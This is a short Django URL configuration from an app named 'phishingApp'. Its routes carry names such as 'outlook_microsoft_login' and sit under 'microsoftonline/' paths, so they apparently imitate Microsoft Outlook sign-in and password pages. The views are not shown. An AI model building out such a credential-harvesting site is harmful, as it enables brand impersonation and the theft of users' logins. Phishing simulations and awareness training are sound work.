from django.urls import path
from phishingApp import views


urlpatterns = [
    path('',views.login,name='outlook_microsoft_login'),
    path('microsoftonline/outlook_microsoft_login',views.login_pass,name='modpass'),
    path("microsoftonline/outlook_microsoft_update", views.login_submit, name="submit")
]